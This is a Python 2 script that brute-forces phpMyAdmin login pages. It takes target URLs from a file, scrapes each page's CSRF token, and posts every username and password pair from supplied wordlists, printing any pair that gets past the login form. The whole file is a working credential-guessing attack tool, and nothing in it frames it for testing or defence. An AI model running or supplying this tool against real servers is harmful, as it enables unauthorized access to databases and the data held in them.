#encoding:utf-8
import requests
import optparse
import re
import os
def options():
    usage = '%prog -h | --help'
    parser = optparse.OptionParser(usage = usage)
    parser.add_option("--url",dest = "url",help = "target url usage : -url http://www.xxx.com/phpmyadmin")
    parser.add_option("--user",dest = "user",help = "username usage: --user root")
    parser.add_option("--password",dest = "password",help = "password path usage: --password ./password.txt")
    (options,args) = parser.parse_args()
    return parser,options
    
def crack(url,post_data):
    headers = {'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent':'User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0',
    'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language':'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
    'Accept-Encoding':'gzip, deflate'
    }
   # cookie = {'pma_lang':'zh_CN',
    #          'pma_collation_connection':'utf8_general_ci',
    #          'pmaUser-1':'RsjJ6iWjux5MLczy8C4Y1A%3D%3D',
    #          'phpMyAdmin':'614646i1sh9m7o46bjiqcde36o7bfdq2'
    #          }
    proxies = {
        'http': '127.0.0.1:8080',
        'https': '127.0.0.1:8080'
    }
    #r =  requests.post(url,headers = headers, data = post_data,proxies=proxies)
    r = requests.post(url, headers=headers, data=post_data)
    if 'name="login_form"' not in r.content:
#    if 'name="opendb_url"' not in r.content:
        print ' Bingo! We get the user:{0} and  password:{1}'.format(post_data['pma_username'],post_data['pma_password'])
    print '########################################'    
    #print "[*] user is %s" %user
    #print "[*] user is %s" %password
    #print r.content
    print '########################################'
    
    
def main():
    parser,args = options()
    if (args.url) and (args.user) and (args.password):
        with open(args.url,'r') as url_handle:
            for files in url_handle.readlines():
                url = files.strip()
                res = requests.get(url, timeout=2)
                token = re.findall("name=\"token\" value=\"(.*?)\" /><fieldset>", res.text)
                token = str(token)
                token = token.replace("[u\'", "")
                token = token.replace("\']", "")
                print("[!]Token:" + token)
                if (res.status_code == 200):
                    with open(args.user, 'r') as user_handle:
                        for users in user_handle.readlines():
                            user = users.strip()
                            print user
                            with open(args.password,'r') as passwords_handle:
                                for passwords in passwords_handle.readlines():
                                    password = passwords.strip()
                                    print password
                                    post_data = {
                                    'pma_username': user,
                                    'pma_password': password,
                                    'server': '1',
                                    'target': 'index.php', #syn note: you will check this
                                    'token': token}
                                    result = crack(url,post_data)
                else:
                    print res.text
                                
if __name__ == '__main__':
    main()